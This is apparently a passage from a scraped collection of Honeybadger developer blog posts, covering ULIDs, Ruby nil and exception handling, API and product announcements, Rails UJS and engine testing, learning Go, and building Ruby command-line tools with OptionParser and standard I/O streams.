In the original version of this blog post I forgot to link to the ULID spec. Here it is . It provides links to implementations in Ruby and other languages. ULIDs are a useful new take on unique identifiers. The most obvious difference is that they look a little different: 01ARZ3NDEKTSV4RRFFQ69G5FAV They are made up of two base32-encoded numbers; a UNIX timestamp followed by a random number. Here's the structure, as defined in the specification : 01AN4Z07BY      79KA1307SR9X4MV3\n\n|----------|    |----------------|\n Timestamp          Randomness\n   48bits             80bits This structure is fascinating! If you recall, UUIDs rely either on timestamps or randomness, but ULIDs use both timestamps and randomness. As a result, ULIDs have some interesting properties: They are lexicographically (i.e., alphabetically) sortable. The timestamp is accurate to the millisecond They're prettier than UUIDs :) These open up some cool possibilities: If you're partitioning your database by date, you can use the timestamp embedded in the ULID to select the correct partition. You can sort by ULID instead of a separate created_at column if millisecond precision is acceptable. There are some possible downsides too: If exposing the timestamp is a bad idea for your application, ULIDs may not be the best option. The sort by ulid approach may not work if you need sub-millisecond accuracy. According to the internet, some ULID implementations aren't bulletproof. Conclusion UUIDs are and will continue to be the standard. They've been around forever, and libraries are available in every language imaginable. However, new approaches are worth considering, especially as we enter a world that's increasingly run by distributed systems. New unique-id approaches may help us solve problems that weren't prevalent at the publication of RFC4122.", "date": "2019-02-14"},
{"website": "Honey-Badger", "title": "Rustic Nil Handling in Ruby", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/rustic-explicit-nil-handling-in-ruby/", "abstract": "For the past six months or so I've been working an NES emulator in Rust. As you might expect, I've learned a lot about rust, and even more about NES internals. But the experience has also changed the way I look at Ruby. Specifically, it's made me more than a little paranoid about methods that return nil . If You Don't Stand for Something, You'll Fall for Anything What does nil mean in Ruby? Almost anything. When a method returns nil, it could mean: The method has no return value There's usually a return value but not this time It returns a value from the database, which is NULL Something unexpected happened This makes code hard to read and is the main cause of the most common Ruby exception in Ruby: NoMethodError . As part-owner of an exception monitoring service, NoMethodError is putting my kid through school. Look at the following code. It returns nil most of the time because if statements evaluate to nil when the conditional doesn't match and there's no else . def color_name ( rgb ) if rgb == 0x000000 \"black\" end end color_name ( \"#FFFFFF\" ). titleize => NoMethodError : undefined method `titleize' for nil:NilClass If you're an experienced Ruby developer, you know this rabbit hole goes much deeper. Sometimes these different meanings of nil overlap in strange ways, making it impossible to know whether — for example — a value in a database is NULL , or there's no value in the database at all. A Better Way In Rust there's no such thing as nil . Instead, when we want to signify that a function sometimes returns a value and sometimes returns \"nothing\" we use an Option . Options are a type that either contains some specific value, or contains no value. Here's what they look like in code: Option :: Some ( 42 ); // Wraps the number 42 in an option Option :: None ; // Indicates \"no result\" This is already looking better than our ad-hoc nil usage, but it gets even better. The Rust compiler forces you to consider the None case. You can't accidentally ignore it. match my_option { Some ( x ) => do_something_with_x ( x ), // If you remove the `None` match below, this code // won't compile. None => do_the_default_thing () } So we could write our color naming example in rust like so: fn color_name ( rgb : u32 ) -> Option < String > { if rgb == 0x000000 { Some ( \"black\" .to_owned ()) } else { None } } Now we're forced to handle both the Some and None conditions: let name = color_name ( 0xFFFFFF ); let name = match color_name ( 0xFFFFFF ) { Some ( value ) => value , None => \"unknown\" .to_owned (), } Sure this is a little verbose and weird looking, but it makes it impossible to ignore the case when a function doesn't return a useful value.\nThat means code that's easier to understand and maintain. Implementing Option in Ruby What Ruby lacks in rigor it makes up for in flexibility. I thought it'd be interesting to try to implement something like Option in Ruby. We can't create compile-time errors in Ruby, since it's an interpreted language. But we can cause incorrect code to always raise an exception, instead of only raising an exception when you hit an edge case. First, let's create two classes. Some holds a read-only value. None is empty. They're as simple as they seem. class Some attr_reader :value def initialize ( value ) @value = value end end class None end Next, we'll create our Option class which holds either Some or None and only lets us access them when we provide handlers for both. class Option def initialize ( value ) @value = value end def self . some ( value ) self . new ( Some . new ( value )) end def self . none () self . new ( None . new ) end def match ( some_lambda , none_lambda ) if @value . is_a? ( Some ) some_lambda . call ( @value . value ) elsif @value . is_a? ( None ) none_lambda . call () else raise \"Option value must be either Some or None\" end end end Finally, we can rewrite our color example to use the new Option class: def color_name ( rgb ) if rgb == 0x000000 Option . some ( \"black\" ) else Option . none () end end puts color_name ( 0x000000 ). match ( -> value { value }, -> { \"no match\" }) # Prints \"black\" Conclusion I've yet to try this technique in a real project. I think it could definitely prevent a lot of the NoMethodErrors that always slip into production. It is a bit cumbersome looking, and not very Rubyish but I imagine that with some refinement a more pleasant syntax would emerge.", "date": "2018-02-13"},
{"website": "Honey-Badger", "title": "Custom exceptions in Ruby", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/ruby-custom-exceptions/", "abstract": "It's easy to create your own exceptions in Ruby. Just follow these steps: 1. Make a New Class Exceptions are classes, just like everything else in Ruby! To create a new kind of exception, just create a class that inherits from StandardError, or one of its children. class MyError < StandardError end raise MyError By convention, new exceptions have class names ending in \"Error\". It's also good practice to put your custom exceptions inside a module. That means your final error classes will look like this: ActiveRecord::RecordNotFound and Net::HTTP::ConnectionError . 2. Add a message Every ruby exception object has a message attribute. It's the longer bit of text that's printed out next to the exception name Example of an exception's message attribute You can specify a message when you raise an exception, like so: raise MyError , \"My message\" And you can add a default message to your custom error class by adding your own constructor. class MyError < StandardError def initialize ( msg = \"My default message\" ) super end end 3. Add a custom data attributes to your exception You can add custom data to your exception just like you'd do it in any other class. Let's add an attribute reader to our class and update the constructor. class MyError < StandardError attr_reader :thing def initialize ( msg = \"My default message\" , thing = \"apple\" ) @thing = thing super ( msg ) end end begin raise MyError . new ( \"my message\" , \"my thing\" ) rescue => e puts e . thing # \"my thing\" end That's it! Creating a custom error or exception in Ruby really isn't that difficult. There is one thing to be aware of. Notice how we always inherited from StandardError in the examples? That's intentional. While there is an Exception class in Ruby, you should NEVER EVER inherit directly from it. For more information about this, check out our article about the differences between Exception and StandardError", "date": "2015-06-02"},
{"website": "Honey-Badger", "title": "Version 2 of our Read API", "author": ["Benjamin Curtis"], "link": "https://www.honeybadger.io/blog/version-2-of-our-read-api/", "abstract": "I'm happy to announce that we have released a new version of our Read API that you can use to get at your Honeybadger data.  This new version\nincludes performance improvements and new endpoints.  Here's a list of\nwhat has changed since V1: All the endpoints that have pages now return a links element in the json that can have up to three links: self , next , and prev . Self is the URL you just fetched, and is always present. The other two give you the next and previous pages of results, and they are omitted if we know there isn’t a previous or next page. You can get a next link that ends up having no results when fetched. The notices, and deploys endpoints now use the new paging params of created_after and created_before rather than page . There are no longer page counts or record counts in the list responses. The id type has changed in the notice response, from an integer to a UUID. The team_id element in the project response has been replaced with a teams element that is an array of hashes that contain the id and name of the teams associated with the project. The assignee element in the fault response has changed from a string (an email address) to an nested user object (id, name, email). The environment , assignee , ignored , and resolved params are no\nlonger supported by the faults list.  These filters have been replaced by the q param, which uses the same search syntax that we use in our UI. We added endpoints for sites, outages, and uptime checks.  The outages and uptime checks endpoints use the created_after and created_before params for paging. The authentication method has been changed -- we now depend on HTTP Basic Auth rather than passing a token in the URL params. The API is now rate-limited. Paging When paging the notices, deploys, outages, and uptime checks endpoints,\nyou can pass a timestamp value (seconds since the epoch) in the created_after and created_before params.  This timestamp can be a\nfloat in order to specify sub-second time resolution.  For example,\nsince the notices endpoint is sorted by most recent notices first, if\nthe last result in the first page of notices that you get back from the\nAPI has 2016-06-20T13:15:00.123456Z as the value for created_at , you\ncan get the next page of results by including created_before=1466428500.123456 in the params. Out with the old, in with the new With the launch of V2, we are officially deprecating V1.  We'll keep V1\naround until August 1st 2016 , to give people a chance to move their\napplications to V2. After August 1st, we'll remove the V1 endpoints .\nPlease note that this deprecation is only for the Read API -- there are\nno changes being made at this time to our Collector API that the\nnotifiers use to send errors from your apps to us. More info You can get all the details about interacting with the API at our documentation site .\nEnjoy!", "date": "2016-06-20"},
{"website": "Honey-Badger", "title": "Announcing enhanced PagerDuty integration", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/announcing-enhanced-pagerduty-integration/", "abstract": "For over a year now you've been able to route your error notifications to PagerDuty. Now you can send outage notifications as well. This feature is enabled by default for all PagerDuty integrations. Here's what it looks like in action: An uptime alert sent by honeybadger to pagerduty. If you've never used our uptime monitoring system before, it's easy to get started. Just click on the \"Uptime\" tab for any app you have in Honeybadger, then click \"monitor a new site\" How to add an uptime check with honeybadger", "date": "2015-08-24"},
{"website": "Honey-Badger", "title": "New Search Features", "author": ["Josh Wood"], "link": "https://www.honeybadger.io/blog/new-search-features/", "abstract": "Today we're releasing a powerful new set of search features not only to help you find errors inside of Honeybadger, but to tell Honeybadger which errors you want to be notified of. If there's one thing we've learned while building Honeybadger, it's that understanding and prioritizing data is hard. Not only must we find the relevant information and present it in a way which is understandable, but then we need to decide what to do with it; this is sometimes referred to as \"signal vs. noise.\" We did our best to tackle these problems specifically for the Ruby community, and we think the results speak for themselves: in 5 minutes or less you can monitor your Ruby app for errors and other performance issues. We also built a ton of options for when and how to be notified of errors, from email and SMS to GitHub, Jira, Slack, HipChat, and many more. One thing we noticed about our integrations is that we didn't always want the same notification everywhere; for example, sometimes we wanted errors from staging to show up on Slack, but only errors from production to be sent via email. To make matters worse, everyone had their own preferences. We built the ability to disable each notification individually for certain environments, but it was soon clear that our customers wanted even more control over what errors they were notified about. Today we're excited to introduce two powerful new features: A new query syntax for our existing (and awesome) error search. Search filters for alerts and integrations. Let's explain each in turn. New query syntax In addition to full-text search across many error attributes such as the class, message, params, and context, we've added a key:value token syntax to filter the results directly from your search query. Here's an example query: ruby\nrequest failed class:httperror -tag:wip -tag:postending component:userscontroller action:update The first part of the query -- \"request failed\" -- is a full-text search. This works like it always has, and will return any results which include the words \"request\" and \"failed\" in the search index. The magic happens at class:HTTPError , which tells us to return only instances of class HTTPError .  Next, \"-tag:wip -tag:pending\" both exclude any errors tagged with \"wip\" or \"pending\". Finally, we only want errors which happened in UsersController#update . These tokens can be combined to form very finely-grained results. To learn more about what kinds of tokens you can use, check out the documentation . Search filters for notifications The new query syntax is pretty powerful, right? What if you could use the same queries to filter each type of error notification available in Honeybadger today for both personal notifications and project integrations? Yeah, we wish we had that too . Just kidding, we totally built that, and it's available today to plans Medium and above. When you edit your alerts and integrations under project settings you will now see a new section called \"Error Filters\": To create a filter: Choose which event you want it to apply to or choose \"All events\". Enter a query just as you would when searching for errors. Save your settings. You should now receive notifications only when they match your new search filter. You can also add multiple filters per event, in which case you will be notified when the error matches any one of the filters for that notification. On a recent JavaScript project I created a filter for \"When a fault occurs\" with a query of -class:window.onerror so that I wouldn't receive any more emails about window.onerror events, since they aren't typically very actionable on that project. That's just one of the myriad ways these filters can be combined to receive actionable alerts, though. Since you can send tags from our Ruby gem amd JavaScript notifiers, why not create a filter for all errors tagged with \"slack\" and then use the filter \"tag:slack\" to tell Honeybadger that Slack should be notified, for example? That's right, it's time to get creative! We'd love to hear about how you find value in this feature. Feel free to drop us a line if you come up with a cool way to use the new filters. Not using Honeybadger yet or need to upgrade? Check out our awesome error tracking plans!", "date": "2015-01-21"},
{"website": "Honey-Badger", "title": "JQuery-Free Rails and Legacy Browsers", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/jquery-free-rails-and-legacy-browsers/", "abstract": "You may have heard that Rails 5.1 will no longer depend on JQuery. Here's the PR . Now, you might be asking yourself: \"Why would a Ruby framework have a dependency on JQuery in the first place?\" The answer lies in in Rails' unobtrusive JavaScript system. That's the bit that makes it possible to do things like: link_to \"delete\" , delete_path , remote: true , method: destroy In order to remove this dependency, the UJS system has been ported to vanilla JS. It's also been given a new gem name. Instead of requiring the jquery-ujs gem, we'll be requiring the rails-ujs gem. Legacy Browser Support The one major drawback to eliminating JQuery is that UJS will no longer support older browsers as well as it used to. One of the reasons for JQuery's size and complexity is that it does support legacy browsers. This potential issue was hinted at in the original Github issue, but nobody specifically mentioned which browsers would be unsupported. That's why I thought it would be interesting to run some tests. I ran the test suites for jquery-ujs 1.2 and the latest rails-ujs (Jan 5, 2017) on IE 8-11. Chrome (55.0.2883.95) was used as a control. Microsoft provides free VMs for testing, if you're playing along at home. Browser jquery-ujs test failures rails-ujs test failures Chrome 0 of 110 0 of 110 IE11 3 of 110 Tests won't run IE10 4 of 110 119 of 122 IE9 4 of 110 119 of 122 IE8 14 of 110 118 of 122 Conclusions Neither of the test suites worked perfectly in IE, but the jquery-ujs suite fared much better. The new Rails UJS system seems to be completely unsupported on IE10 and down. I was unable to get a good reading on IE11 as a the test suite refused to run. Supposedly it will be possible to load the older jquery-ujs gem on top of the new rails-ujs to bring back legacy browser support. I haven't had a chance to see if it works yet.", "date": "2017-01-30"},
{"website": "Honey-Badger", "title": "Testing controllers in Rails 4 engines", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/rails4-engine-controller-specs/", "abstract": "Testing controllers in Rails engines with RSpec requires you to jump through some hoops. If memory serves, it was slightly trickier in Rails 3 than it is now in Rails 4. Fortunately the fix is pretty easy, if not obvious. By the way, I'm standing on the shoulders of giants here. What I've done is to combine the most useful parts of two particular Stack Overflow answers, remove the now incorrect/irrelevant parts, and spoon-feed you the solution in the form of a complete example. First we'll create our engine which we'll call \"Appointly.\" (It's an imaginary appointment scheduling gem.) $ rails plugin new appointly --mountable -T --dummy-path = spec/dummy Next step is to add the rspec-rails gem to our gemspec : # appointly.gemspec s . add_dependency \"rspec-rails\" , \"~> 2.14.1\" And install RSpec: $ bundle install $ rails generate rspec:install Everything has been straightforward so far. Now is where we have to modify spec/spec_helper.rb in exactly two places. I've tried to make it blatantly obvious what exactly it is you need to change. # spec/spec_helper.rb # This file is copied to spec/ when you run 'rails generate rspec:install' ENV [ \"RAILS_ENV\" ] ||= 'test' ################################################################ # Change this # require File.expand_path(\"../../config/environment\", __FILE__) # # to this require File . expand_path ( \"../dummy/config/environment\" , __FILE__ ) ################################################################ require 'rspec/rails' require 'rspec/autorun' # Requires supporting ruby files with custom matchers and macros, etc, # in spec/support/ and its subdirectories. ################################################################ # Change this # Dir[Rails.root.join(\"spec/support/**/*.rb\")].each { |f| require f } # To this ENGINE_RAILS_ROOT = File . join ( File . dirname ( __FILE__ ), '../' ) Dir [ File . join ( ENGINE_RAILS_ROOT , \"spec/support/**/*.rb\" )]. each { | f | require f } ################################################################ # Checks for pending migrations before tests are run. # If you are not using ActiveRecord, you can remove this line. ActiveRecord :: Migration . check_pending! if defined? ( ActiveRecord :: Migration ) RSpec . configure do | config | # ## Mock Framework # # If you prefer to use mocha, flexmock or RR, uncomment the # appropriate line: # # config.mock_with :mocha # config.mock_with :flexmock # config.mock_with :rr # Remove this line if you're not using ActiveRecord or ActiveRecord # fixtures config . fixture_path = \" #{ :: Rails . root } /spec/fixtures\" # If you're not using ActiveRecord, or you'd prefer not to run each of # your examples within a transaction, remove the following line or # assign false instead of true. config . use_transactional_fixtures = true # If true, the base class of anonymous controllers will be inferred # automatically. This will be the default behavior in future versions of # rspec-rails. config . infer_base_class_for_anonymous_controllers = false # Run specs in random order to surface order dependencies. If you find # an order dependency and want to debug it, you can fix the order by # providing the seed, which is printed after each run. # --seed 1234 config . order = \"random\" end In addition to changing those paths, we have to tell our engine to use RSpec as the default test framework: # lib/appointly/engine.rb module Appointly class Engine < :: Rails :: Engine isolate_namespace Appointly config . generators do | g | g . test_framework :rspec end end end And now we're good to go. Let's generate a scaffold and create/migrate our database. $ rails g scaffold appointment start_time:datetime $ rm -rf test # For some reason Rails still generates the test directory $ rake db:create $ rake db:migrate RAILS_ENV = test If we run one of our controller specs now... $ rspec spec/controllers/appointly/appointments_controller_spec.rb:34 ...it will fail. What happened? My understanding here is that since our engine is an isolated engine - an engine designed not to interfere with the routes, helpers, etc. defined in your application - we need to explicitly say we're using Appointly routes, not the dummy app's routes. Add use_route: :appointly to your spec: describe \"GET index\" do it \"assigns all appointments as @appointments\" do appointment = Appointment . create! valid_attributes # get :index, {}, valid_session get :index , { use_route: :appointly }, valid_session assigns ( :appointments ). should eq ([ appointment ]) end end Run the spec again... $ rspec spec/controllers/appointly/appointments_controller_spec.rb:34 ...and it will pass.", "date": "2014-01-29"},
{"website": "Honey-Badger", "title": "Why Rubyists Should Consider Learning Go", "author": ["Ayooluwa Isaiah"], "link": "https://www.honeybadger.io/blog/rubyist-learn-go/", "abstract": "Ruby and Rails are great tools that allow you to create complex web applications quickly. Well, some kinds of complex web applications. While they excel at traditional, monolithic, server-rendered applications, they fail to excel at delivering real-time or distributed services. This is why it's so handy for Rubyists to learn a language like Go. Go is designed for writing light-weight services that handle lots of inbound connections. Its strengths line up surprisingly well with Ruby's weaknesses. If you know both of them, you're basically unstoppable. This article is the first in a series about learning Go from a Rubyist's perspective. It will cover the same basic principles of the langue you'll find in any other tutorial. However, it will spend time on the areas of the language you might find strange coming from Ruby and will point out possibilities that might not be obvious. What's Go? Go is a compiled, statically typed programming language designed at Google by Robert Griesemer, Rob Pike, and Ken Thompson and was first announced in 2007, more than 10 years after the first release of Ruby. The idea of developing a new programming language was born out of frustrations related to the use of other languages at Google. The goal was to create a language that solved modern programming challenges while eliminating all the irrelevant features that made it difficult to maintain code written in languages like C++. Go is minimalist. Its syntax is tiny, with only 25 keywords. Its spec is relatively easy to read. That means you can get up and running quickly. Let's see what \"hello world\" looks like in go: // Hello World! program in Go package main ; import \"fmt\" ; func main (){ fmt . Println ( \"Hello World!\" ) } Go offers type-safety AND a fast development cycle As a Ruby developer, you can write code and then run it immediately. Many of us have never known anything different, so we don't realize what a luxury a fast development cycle is. Languages like C++ must be compiled. This can take minutes or even hours on larger code bases. Can you imagine how frustrating it would be to wait that long to run the code you just wrote? Of course, the reason it takes so long is that the C++ compiler does a lot of work up-front that Ruby doesn't. In C++, if you misspell a method name, the compiler will tell you. This is because C++ is 'type-safe.' In Ruby, you don't know you made a mistake until you run the code and get the common NoMethodError . Go gives you the best of both worlds: a fast development cycle AND type-safety. Go offers the same fast development experience typical of dynamic languages due to its lightning-fast compile times while providing the type-safety that these languages lack. Go programs are also really fast; they're not quite on the level of Rust or C but are much faster than other languages, such as Ruby or Python. Go is a multi-purpose language and can be used in many different areas of software development. It’s particularly well-suited for network applications and distributed cloud services due to its baked-in concurrency features, which allow applications to make effective use of the available resources of the hardware running it. Go is simple Avoiding the incorporation of too many features was a specific design goal for Go from the moment it was conceived. Many other languages want to keep adding more features, the reasoning often being for the sake of expressiveness. The designers of Go reject this philosophy by choosing to only include features that cover a solution space and interact predictably with the other features of the language. Ken Thompson, one of the original designers of the language, sums up this unusual stance quite nicely: “When the three of us [Thompson, Rob Pike, and Robert Griesemer] got started, it was pure research. The three of us got together and decided that we hated C++. [laughter] ... [Returning to Go,] we started off with the idea that all three of us had to be talked into every feature in the language, so there was no extraneous garbage put into the language for any reason.” Through the years, the Go team has stayed true to that philosophy. This has resulted in a language that is designed for clarity even at the cost of being verbose in certain situations (such as when handling errors). // Error handling in Go result , err := object . DoSomething () if err != nil { log . Printf ( \"Something failed\" , err ) return err } Go programs are typically very readable and easy to maintain because, aside from the business logic, you don't need to understand too many things to work on any codebase even an unfamiliar one, and you don't have the problem where every developer uses a different subset of the language, as is often the case in large software projects written in other languages. Go is opinionated Go has strong opinions on how you should write and format your code. For this reason, all Go code looks just about the same. This quality helps reduce the cognitive load when acquainting oneself with an unfamiliar codebase and eliminates unnecessary bike shed arguments about trivial details, such as spacing or brace position. Tools such as gofmt , and golint are built into the language and provide formatting and linting for all Go code in existence, and the rules they follow are not configurable in any way. For example, gofmt formats Go programs using tabs for indentation. Do you prefer spaces over tabs? Well, you can't change it. Not with gofmt at least. Go does not allow you to import a package or declare a variable without using it. If you attempt this, the code will fail to compile. The idea behind this behavior is to trade short-term convenience for long-term compilation speed and program clarity. Access modifier keywords are not present in the language. There are no public , private ,  or protected keywords. Go supports two access modifiers for variables, functions, and other types (i.e., exported and unexported), and they work at the package level. If you want to make an unexported identifier (one not accessible outside a package), start it with a lowercase letter. As you can probably guess, exported identifiers start with a capital letter. This is immediately understood when reading code and makes the code more succinct. var Foo string ; // exported var bar int ; // unexported Go's testing package comes with an expectation that any test file must have a _test.go suffix. A file called program.go must have its corresponding test file to be program_test.go . This is so that Go can ignore test files when compiling the code because they are not needed for the program to run. When you want to test your code, the go test command is provided out of the box, which executes these files and runs tests. Go is polarizing While Go has its fair share of advocates, criticizing the language has become fashionable these days. There's even a GitHub repository dedicated to listing articles that complain about Go. Most of them focus on the features Go doesn't have or how some things are broken in the language. Like every other language, Go has its fair share of baggage and shortcomings. As the language evolves, these things will likely improve over time. A major strength of Go is its underlying minimalist philosophy. However, it's not perfect, and certain aspects can be improved, including the lack of generics . Go will never make everyone happy, but when used for the problem sets it was designed for, it is an absolute winner! Go is great for web development Go has an amazing standard library that allows you to rapidly develop scalable and secure web applications without reaching out for a framework. It ships with a fully functional web server ( net/http ) and includes templating, routing, and most things for which you would need something like Rails. For many types of projects, sticking to the standard library is a perfectly reasonable approach. For times when the standard library does not meet your expectations, several third-party packages exist that complement the standard library, such as the Gorilla Toolkit . Also, if you do need an all-encompassing framework, you'll be pleased to learn that several options exist. You can look at Buffalo if you're looking for something with similar characteristics to Rails. The deployment story for Go programs is also a breeze! You don't need to install anything on the server; just compile the project for your target operating system, and you'll get a single portable binary that can be uploaded and executed on your server. For example, to build for a Windows environment from a Linux machine, you can use this command: GOOS = windows GOARCH = 386 go build -o hello.exe hello.go The resulting hello.exe file will run on any Windows machine with an x86 CPU without requiring any further setup. This is great for containers too; just toss a binary in a lightweight Docker container, set some environmental variables, and run the application! If problems arise after deployment and you need to roll back, you can easily revert back to the previous binary. Since the entire program is compiled to a single binary, you never need to worry about a dependency being upgraded inadvertently. Go programs also typically use much fewer resources in terms of CPU and memory resources compared to Rails, which helps bring down server costs significantly. For example, Iron was able to reduce their memory usage from 50MB to a few hundred kilobytes on start-up when they switched from Rails to Go. Due to its built-in concurrency features, Go is perfectly suited for large software projects that require thousands of requests to be handled simultaneously. Go uses goroutines to execute some code concurrently while you proceed with other tasks, and a lightweight communication mechanism called 'channels' helps you to avoid concurrent data modification. Getting started with Go If you're sold on learning Go, you can follow the instructions provided here to download and install it on your machine. To learn the basic syntax and features of the language, use A Tour of Go . 'Go by example' is another good resource to investigate. Want to build programs with what you’ve learned? Use Gophercises . It features free tutorials that cover practical aspects of the language by building several projects, each one designed to teach you something different. If you want to read a book, The Go Programming Language and Go in action are excellent reads. Wrap-up The choice of whether to use Go or Ruby will vary depending on your project requirements. Both are great skills to have, and they can definitely coexist in your language toolbox. Learning Go as a Ruby developer will open your eyes to other paradigms in software development. It will feel strange and foreign at times but will ultimately give you a different perspective and help you become a better developer. I hope this article has helped pique your curiosity about Go and prompted you to think about how you can utilize it in your current and future software projects. Thanks for reading!", "date": "2020-04-29"},
{"website": "Honey-Badger", "title": "Writing command-line apps in Ruby", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/writing-command-line-apps-in-ruby/", "abstract": "While it's fun to write little one off utility scripts, sometimes you need to write a real honest to God command-line application. One that takes arguments and plays nicely with unix conventions for input, output, error reporting, etc. Fortunately, Ruby gives you all the building blocks you need to command-line applications fairly easily. In this post I hope to go beyond the typical \"how to do X with gem Y\" approach, and instead do a broad overview of all the pieces that go together to make a first-rate command-line app. Input: Environment Variables Environment variables are typically used for short configuration values that you want to stick around for a while. API keys are a good example. Setting Environment Variables Users normally set environment variables via a shell like bash. They can set them for a specific session: $ AWS_ACCESS_KEY_ID=FOO They can set them for the current session, plus any new bash session: $ export AWS_ACCESS_KEY_ID=FOO Or they can set them for a single program: $ env AWS_ACCESS_KEY_ID=FOO aws s3 mb s3://mybucket Reading Environment Variables Regardless of how the user sets the environment variable, you can read it via Ruby's ENV hash. key_id = ENV [ \"AWS_ACCESS_KEY_ID\" ] How do environment vars work under the hood? Every process has a table of environment variables associated with it. When it spawns child processes, they get a copy of that table along with whatever changes the parent wants to make. Clear as mud? For a more readable explanation, check out my other blog post: The Rubyist's Guide to Environment Variables . Command-line arguments Command-line arguments are anything you put after the program name when you run a program in the terminal: $ echo foo bar baz In the example above \"foo\", \"bar\" and \"baz\" are all command-line arguments. A more realistic example might look like this: $ honeybadger deploy -v --environment staging But even here, the command-line arguments are just text. If we want --environment staging to mean anything, we have to figure that out for ourselves. Sending command-line arguments We've already seen arguments sent like this: $ echo foo bar baz But since Ruby is an interpreted language, you might also come across something like this: $ ruby myprog.rb foo As far as the OS is concerned, you're running a program called \"ruby\" and passing it two arguments. Luckily, Ruby is smart enough to know that the argument \"foo\" is intended for your program, not for Ruby itself. So your program will see one argument, \"foo\" . Reading command-line arguments Command-line arguments are stored in a array called ARGV . It's a global variable, so you can access it from anywhere in your program. In the example below, we're printing everything in ARGV . Feel free to copy and paste this into your terminal and play around with it a bit. $ ruby - e \"puts ARGV.inspect\" foo bar baz [ \"foo\" , \"bar\" , \"baz\" ] Please don't be thrown off by the ruby -e business. I'm only using it here because it lets me show the program and the result of running it in a single line. Parsing command-line arguments Command-line arguments are just text. If you want the text to mean anything, you're going to have to parse it. Fortunately, there are several good libraries that can help you with the parsing. Over the years, a somewhat standard syntax for command-line arguments has emerged. It looks something like this: $ program -a --option foo This style lets you have boolean flags like -h to display help. It also lets you specify options with values. Introducing OptionParser The OptionParser class is part of Ruby's standard library. It gives you an easy way to parse options that match the style above. Let's make a simple application that says hello. It will let you specify name via the command-line argument. require 'optparse' # This will hold the options we parse options = {} OptionParser . new do | parser | # Whenever we see -n or --name, with an # argument, save the argument. parser . on ( \"-n\" , \"--name NAME\" , \"The name of the person to greet.\" ) do | v | options [ :name ] = v end end . parse! # Now we can use the options hash however we like. puts \"Hello #{ options [ :name ] } \" if options [ :name ] Then when I run it, it just works: $ ruby hello.rb --name Starr\nHello Starr\n\n$ ruby hello.rb -n Starr\nHello Starr Adding a \"help\" screen Adding a help feature is just as easy. All we have to do is provide some text, and add a command for -h : OptionParser . new do | parser | parser . banner = \"Usage: hello.rb [options]\" parser . on ( \"-h\" , \"--help\" , \"Show this help message\" ) do || puts parser end ... end . parse! Now we can ask for help: $ ruby hello.rb -h\nUsage: hello.rb [options]\n    -h, --help                       Show this help message\n    -n, --name NAME                  The name of the person to greet. Typecasting arguments All command-line arguments are strings, but sometimes you'd like the user to give you a number or a date. Doing the conversion by hand can be tedious, so OptionParser does it for you. In the example below, I'm going to add a \"count\" option that lets the user specify how many times the program should say hello. I'm telling OptionParser to cast to an Integer , which it does. OptionParser.new do |parser|\n\n  ...\n\n  # Note the `Integer` arg. That tells the parser to cast the value to an int.\n  # I could have used `Float`, `Date`, or a number of other types.\n  parser.on(\"-c\", \"--count COUNT\", Integer, \"Repeat the message COUNT times\") do |v|\n    options[:count] = v\n  end\n\nend.parse!\n\nif options[:name]\n  options.fetch(:count, 1).times do\n    puts \"Hello #{ options[:name] }\"\n  end\nend Now, when I run the program I'm greeted multiple times: $ ruby hello.rb -n Starr -c 5\nHello Starr\nHello Starr\nHello Starr\nHello Starr\nHello Starr Naming conventions One of the hardest aspects of programming can be figuring out what to name things. Command-line arguments are no exception. To help you, I've compiled a short table of common arguments and their meanings: Flag Common Meanings -a All, Append -d Debug mode, or specify directory -e Execute something, or edit it -f Specify a file, or force an operation. -h Help -m Specify a message -o Specify an output file or device -q Quiet mode -v Verbose mode. Print the current version -y Say \"yes\" to any prompts Alternatives to OptionParser OptionParser is nice, but it does have its limitations. Most obviously, it doesn't support the command-based syntaxes that have become popular in recent years: $ myprog command subcommand -V Fortunately, there are a ton of option parsing libraries out there. I'm sure you'll be able to find one that you like. Here are three that look kind of interesting: GLI - The \"Git-like Interface\" command-line parser allows you to easily make applications that, like git, are a single executable with multiple commands. CRI - An easy-to-use library for building command-line tools with support for nested commands. Methadone - Methadone provides its own option parsing DSL, but it goes way beyond that. It will set up a directory structure for you, a test suite and logging. It's like Rails for your CLI. Inputting larger amounts of data with STDIN Command-line arguments aren't suitable for inputting larger amounts of data. For that, you'll want to use an IO stream. And STDIN is one of the most convenient IO streams out there. Most programs will automatically be assigned a STDIN by the operating system. It's like a read-only file that the OS uses to send your app data. It can be used to get keyboard input from the user. But more importantly, it can be used to receive data from other programs via a pipe. You use STDIN just like you'd use a read-only file. Here, I'm piping some text into the STDIN of my program. Then I use the read method to fetch it. $ echo \"hello world\" | ruby - e \"puts STDIN.read.upcase\" HELLO WORLD In Ruby, you can use Enumerable features on IO objects. And STDIN is no exception. That means you can do all sorts of tricks: # Get the first 20 lines STDIN . first ( 20 ) # Convert to integers and reject odds STDIN . map ( & :to_i ). reject ( & :odd ) ... etc Outputting results to STDOUT STDOUT is a write-only IO stream that the operating system assigns to your program. By writing to STDOUT, you can send text to the user's terminal. The user can redirect the output to a file, or pipe it into another program. You'll use STDOUT just like you'd use any other write-only file: STDOUT . write ( \"Hi! \\n \" ) # hi And of course, puts and print both output to STDOUT. Sending status information to STDERR STDERR is yet another write-only IO stream. It's not for general output. It's specifically for status messages — so they don't get in the way of the real output. STDERR will usually be displayed in the user's terminal, even if they're redirecting STDOUT to a file or another program. In the example below we are using curl to fetch a webpage. It outputs the content of the webpage to STDOUT, and displays progress information to STDERR: $ curl \"https://www.google.com/\" > /tmp/g.html\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  151k    0  151k    0     0   277k      0 --:--:-- --:--:-- --:--:--  277k Writing to STDERR from your own programs is easy. Just treat it like the IO object it is: STDERR . write ( \"blah \\n \" ) STDERR . puts ( \"blah\" ) Hitting it with the pretty stick The examples we've seen so far aren't going to win any design awards. But there's no reason that command-line apps should be ugly, or non-interactive. If you decide to soup up your app, there are a ton of great gems to do some of the heavy lifting. Here are three that I like: highline - Highline is a great library that takes a lot of the work out of gathering, validating, and typecasting user input. command_line_reporter - Makes it easy to generate ASCII progress reports. paint - Lets you easily add ANSI color codes to colorize your boring old text. See a more exhaustive list Exit Status If your program exits with an error, you should tell the OS by way of an 